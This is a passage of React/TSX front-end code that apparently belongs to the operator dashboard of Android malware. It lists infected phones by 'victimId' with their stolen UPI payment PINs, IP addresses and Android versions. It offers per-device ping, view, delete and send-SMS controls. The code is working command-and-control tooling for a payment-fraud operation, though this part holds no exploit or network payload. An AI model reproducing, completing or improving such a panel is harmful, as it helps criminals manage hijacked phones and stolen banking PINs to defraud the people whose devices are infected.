                                  <Button size="icon" variant="ghost" className="w-6 h-6 p-0" onClick={(e) => { e.stopPropagation(); handleNoteDraftChange(victimId, ""); setTimeout(() => noteInputRefs.current[victimId]?.focus(), 0); }}>
                                    <X className="w-3 h-3" />
                                  </Button>
                                </div>
                              </SelectContent>
                            </Select>
                          </div>
                        );
                      })()}
                    </TableCell>
                    <TableCell className="text-center">{formatAdded(device.Added)}</TableCell>
                    <TableCell className="text-center">
                      <div className="flex items-center justify-center gap-2">
                        <Button variant="outline" size="sm" onMouseEnter={() => handlePrefetchDevice(victimId)} onClick={(e) => handleViewDevice(victimId, device, e)}>
                          <Eye className="w-4 h-4" />
                        </Button>
                        <Button variant="outline" size="sm" onClick={(e) => handlePingDevice(victimId, device, e)}>
                          <Loader2 className="w-4 h-4" />
                        </Button>
                        <Button variant="outline" size="sm" onClick={(e) => handleSendSMS(victimId, device, e)}>
                          <MessageSquare className="w-4 h-4" />
                        </Button>
                        <Button variant="destructive" size="sm" onClick={() => handleDeleteDevice(victimId, device.Model)}>
                          <Trash2 className="w-4 h-4" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        ) : (
          <div className="overflow-x-auto">
            {/* Header mimic */}
            <div className="grid grid-cols-8 gap-2 px-4 py-3 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
              <div className="text-center">Status</div>
              <div>Device</div>
              <div className="text-center">Android</div>
              <div className="text-center">UPI Pin</div>
              <div className="text-center">IP Address</div>
              <div className="text-center">Note</div>
              <div className="text-center">Added</div>
              <div className="text-center">Actions</div>
            </div>
            <List height={LIST_HEIGHT} itemCount={filteredAllDevices.length} itemSize={ROW_HEIGHT} width={'100%'}>
              {Row}
            </List>
          </div>
        )}

        {/* Pagination and Rows per Page */}
        <div className="p-6 border-t bg-muted/20">
          <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
            {/* Rows per page */}
            <div className="flex items-center gap-2">
              <Label htmlFor="rows-per-page" className="text-sm">
                Rows per page
              </Label>
              <Select
                value={rowsPerPage.toString()}
                onValueChange={handleRowsPerPage}
              >
                <SelectTrigger id="rows-per-page" className="w-24">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="5">5</SelectItem>
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="25">25</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                  <SelectItem value="200">200</SelectItem>
                  <SelectItem value="300">300</SelectItem>
                  <SelectItem value="400">400</SelectItem>
                  <SelectItem value="500">500</SelectItem>
                  <SelectItem value="600">600</SelectItem>
                  <SelectItem value="700">700</SelectItem>
                  <SelectItem value="800">800</SelectItem>
                  <SelectItem value="900">900</SelectItem>
                  <SelectItem value="1000">1000</SelectItem>
                  <SelectItem value="2000">2000</SelectItem>
                  <SelectItem value="5000">5000</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Pagination */}
            <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground">
                {startIndex + 1}-
                {Math.min(endIndex, filteredAndPaginatedDevices.length)} of{" "}
                {filteredAndPaginatedDevices.length}
              </span>

              <div className="flex items-center gap-1">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToPreviousPage}
                  disabled={currentPage === 1}
                  className="w-8 h-8 p-0"
                >
                  <ChevronLeft className="w-4 h-4" />
                </Button>

                {getPageNumbers().map((page, index) => (
                  <Button
                    key={index}
                    variant={page === currentPage ? "default" : "outline"}
                    size="sm"
                    onClick={() => typeof page === "number" && goToPage(page)}
                    disabled={page === "..."}
                    className="w-8 h-8 p-0"
                  >
                    {page}
                  </Button>
                ))}

                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToNextPage}
                  disabled={currentPage === totalPages}
                  className="w-8 h-8 p-0"
                >
                  <ChevronRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          </div>
        </div>
      </Card>

      {/* Send SMS Dialog */}
      {selectedDevice && (
        <SendSMSDialog
          isOpen={smsDialogOpen}
          onClose={closeSMSDialog}
          device={selectedDevice.info}
          deviceId={selectedDevice.id}
        />
      )}
    </>
  );
}
